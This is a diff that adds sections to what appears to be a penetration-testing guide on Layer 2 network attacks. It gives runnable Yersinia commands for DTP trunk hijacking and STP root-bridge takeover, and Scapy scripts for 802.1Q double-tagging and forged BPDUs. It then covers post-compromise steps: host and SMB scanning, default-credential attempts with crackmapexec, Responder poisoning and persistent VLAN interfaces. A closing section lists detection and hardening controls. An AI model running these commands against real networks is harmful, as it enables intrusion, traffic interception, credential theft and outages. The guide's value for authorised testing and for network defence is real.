@@ -167,9 +167,246 @@ Secure configurations:
   - Enable Dynamic ARP Inspection (DAI) and DHCP snooping
 ```
 
+## DTP Exploitation with Yersinia
+
+```bash
+# DTP (Dynamic Trunking Protocol) — Cisco proprietary trunking negotiation
+# Switch ports in "dynamic auto" or "dynamic desirable" mode will negotiate
+# a trunk with any device requesting one
+
+# Verify DTP frames are being sent by the switch (passive check first)
+tcpdump -i eth0 'ether dst 01:00:0c:cc:cc:cd' -v
+# DTP uses multicast destination 01:00:0c:cc:cc:cd
+# If you see DTP frames, the port is negotiable
+
+# Yersinia — interactive DTP trunk negotiation
+yersinia -I
+# Navigate: Select protocol → DTP → Launch attack → "Enable trunking mode"
+# This sends DTP Desirable frames to the switch
+# Switch responds by forming a trunk → you now carry all VLANs
+
+# Yersinia CLI mode (non-interactive)
+yersinia dtp -attack 1 -interface eth0
+# Attack type 1 = Sending DTP Desirable packets
+
+# Verify trunk was established (DTP success indicator)
+tcpdump -i eth0 'vlan' -c 20
+# If you see tagged frames with various VLAN IDs → trunk is up
+
+# After trunk established — enumerate available VLANs
+tcpdump -i eth0 'ether dst 01:00:0c:cc:cc:cc' -v
+# VTP advertisements contain full VLAN list for the domain
+
+# Set up VLAN subinterfaces to access discovered VLANs
+modprobe 8021q
+for vlan_id in 10 20 30 40 50; do
+    ip link add link eth0 name eth0.$vlan_id type vlan id $vlan_id
+    ip link set eth0.$vlan_id up
+    dhclient eth0.$vlan_id &
+done
+ip addr show  # Check which VLANs assigned DHCP addresses
+```
+
+## 802.1Q Double-Tagging Attack Mechanics
+
+The double-tagging attack is one-directional — you can send frames into a target VLAN but cannot receive direct replies. Best used to trigger callbacks (reverse shells, DNS requests, HTTP fetches).
+
+```bash
+# Requirements for double-tagging to succeed:
+# 1. Attacker is connected to an access port on the NATIVE VLAN of the trunk uplink
+# 2. The switch does not strip double-tagged frames (most do not by default)
+# 3. Native VLAN = VLAN 1 (Cisco default) or whatever the trunk native VLAN is
+
+# Verify your VLAN (check what DHCP gives you — first octet range often indicates VLAN)
+ip addr show eth0
+# If 192.168.1.x → you may be in VLAN 1 (native VLAN)
+
+# Step 1: Identify native VLAN of the trunk uplink
+# Method A: CDP — reveals native VLAN in Cisco Discovery Protocol frames
+tcpdump -i eth0 'ether proto 0x2000' -v 2>/dev/null | grep -i "native vlan\|vlan id"
+
+# Method B: Observe untagged frames on the wire — untagged = native VLAN
+
+# Step 2: Craft double-tagged packet with Scapy
+python3 << 'EOF'
+from scapy.all import *
+
+# Replace with actual values
+native_vlan = 1     # outer tag — stripped by first switch (your VLAN)
+target_vlan = 20    # inner tag — delivered into target VLAN
+target_ip   = "192.168.20.5"    # target in VLAN 20
+
+# ICMP probe to verify reach
+pkt = (
+    Ether(dst="ff:ff:ff:ff:ff:ff") /
+    Dot1Q(vlan=native_vlan, type=0x8100) /
+    Dot1Q(vlan=target_vlan) /
+    IP(dst=target_ip, ttl=64) /
+    ICMP()
+)
+sendp(pkt, iface="eth0", verbose=True)
+EOF
+
+# Step 3: Trigger reverse callback from target
+# Since replies can't return via double-tagging, use techniques that
+# initiate outbound connections FROM the target back to attacker:
+# - Send double-tagged TCP SYN to port 80 → if target makes HTTP request → DNS resolves to attacker
+# - ARP request to target_ip (ARP replies are broadcast → may reach you via switch flooding)
+# - ICMP with spoofed source in target VLAN (tricky — use VLAN interface on attacker)
+
+# Step 4: More reliable — use Yersinia for double encapsulation attack
+yersinia -I
+# 802.1Q protocol → "Send 802.1Q double encapsulated packet"
+```
+
+## STP (Spanning Tree Protocol) Attacks
+
+STP prevents switching loops by electing a root bridge and blocking redundant links. An attacker injecting a superior BPDU becomes the root bridge, forcing all spanning tree traffic to flow through the attacker.
+
+```bash
+# WARNING: STP root injection can cause network outages
+# Traffic re-converges through attacker → brief interruption → some switches
+# may loop or experience outage during convergence. Use only when authorized.
+
+# Check for STP traffic (passive — safe)
+tcpdump -i eth0 'ether dst 01:80:c2:00:00:00' -v
+# STP BPDUs use multicast 01:80:c2:00:00:00
+# Reveals: current root bridge, root bridge priority, port states
+
+# Yersinia STP attack — inject superior BPDU to become root bridge
+yersinia -I
+# STP → "Claiming root role"
+
+# CLI mode
+yersinia stp -attack 1 -interface eth0
+# Attack 1 = sending CONF BPDU (claiming to be root)
+# Attack 2 = sending TCN BPDU (topology change notification — causes MAC table flush)
+
+# Scapy manual BPDU (superior root bridge claim)
+python3 << 'EOF'
+from scapy.all import *
+
+# Craft a BPDU with lower priority than current root (lower = better in STP)
+bpdu = (
+    Ether(dst="01:80:c2:00:00:00", src="de:ad:be:ef:00:01") /
+    LLC(dsap=0x42, ssap=0x42, ctrl=3) /
+    STP(bpdutype=0,       # Configuration BPDU
+        bpduflags=0,
+        rootid=0x0001,    # Root bridge priority = 1 (very low — wins election)
+        rootmac="de:ad:be:ef:00:01",
+        pathcost=0,
+        bridgeid=0x0001,
+        bridgemac="de:ad:be:ef:00:01",
+        portid=0x8001,
+        age=0, maxage=20, hellotime=2, fwddelay=15)
+)
+sendp(bpdu, iface="eth0", loop=1, inter=2)
+EOF
+
+# Effect: other switches accept attacker as root → MITM on inter-switch traffic
+# Attacker sees all traffic that traverses the core switch path
+```
+
+## Post-VLAN-Hop Pivot
+
+Once you reach a target VLAN, treat it like a fresh network foothold.
+
+```bash
+# Immediate reconnaissance on new VLAN
+# 1. Check what network you're in
+ip addr show
+# 2. Discover hosts in the new segment
+nmap -sn 192.168.20.0/24
+arp-scan --interface=eth0.20 192.168.20.0/24
+
+# 3. Quick port scan of key targets
+nmap -p 22,80,443,445,3389,8080 192.168.20.0/24 --open
+
+# 4. Identify high-value targets
+nmap --script smb-os-discovery -p 445 192.168.20.0/24  # Windows hosts
+nmap --script ldap-rootdse -p 389 192.168.20.0/24       # Domain controllers
+
+# 5. SMB relay targets in new VLAN
+crackmapexec smb 192.168.20.0/24 --gen-relay-list /tmp/vlan20_relay.txt
+
+# 6. Run Responder on new VLAN interface
+responder -I eth0.20 -wr
+
+# 7. Check for easy wins (default credentials, unpatched services)
+nmap --script smb-vuln-ms17-010 -p 445 192.168.20.0/24
+crackmapexec smb 192.168.20.0/24 -u administrator -p administrator
+```
+
+## Infrastructure for Persistent VLAN Access
+
+```bash
+# Once trunk is established via DTP, make it persistent
+
+# 1. Create VLAN subinterfaces (survives interface up/down)
+modprobe 8021q
+echo "8021q" >> /etc/modules
+
+# 2. Create persistent VLAN interfaces via /etc/network/interfaces (Debian/Ubuntu)
+cat >> /etc/network/interfaces << 'EOF'
+auto eth0.10
+iface eth0.10 inet dhcp
+    vlan-raw-device eth0
+
+auto eth0.20
+iface eth0.20 inet dhcp
+    vlan-raw-device eth0
+EOF
+
+# 3. Route between VLANs through attacker (become router)
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+
+# 4. Access VLAN 20 hosts from attacker tooling
+# Just use the eth0.20 interface directly:
+nmap -e eth0.20 192.168.20.0/24
+crackmapexec smb 192.168.20.0/24 --interface eth0.20
+```
+
+## Detection Context
+
+```
+Detection controls relevant to VLAN attacks:
+
+Port Security (limits MACs per port):
+  - Blocks new MACs from appearing on access ports
+  - Would flag a rogue device joining with a new MAC
+  - Config: switchport port-security maximum 2
+
+BPDU Guard (protects access ports from STP injection):
+  - Disables port immediately if BPDU is received
+  - Prevents STP root bridge attacks and rogue switches
+  - Config: spanning-tree bpduguard enable (per port)
+  - Config: spanning-tree portfast bpduguard default (globally)
+
+Root Guard:
+  - Prevents a port from becoming the root bridge path
+  - Less disruptive than BPDU Guard (drops superior BPDUs, doesn't shut port)
+  - Config: spanning-tree guard root
+
+Dynamic ARP Inspection (DAI):
+  - Validates ARP packets against DHCP snooping binding table
+  - Blocks gratuitous ARP from non-DHCP-leased addresses
+  - Makes ARP MITM much harder even after VLAN hop
+
+Storm Control:
+  - Rate-limits broadcast/multicast floods
+  - Limits damage from STP topology changes or DHCP starvation
+
+Disable DTP on access ports:
+  - switchport nonegotiate
+  - switchport mode access
+  - Eliminates DTP trunk negotiation attack entirely
+```
+
 ## Resources
 
 - Yersinia — `github.com/tomac/yersinia`
 - MITRE T1599 — Network Boundary Bridging — `attack.mitre.org/techniques/T1599/`
 - Scapy documentation — `scapy.net`
 - Cisco 802.1Q VLAN security guide — `cisco.com`
+- IEEE 802.1Q specification — `ieee802.org`
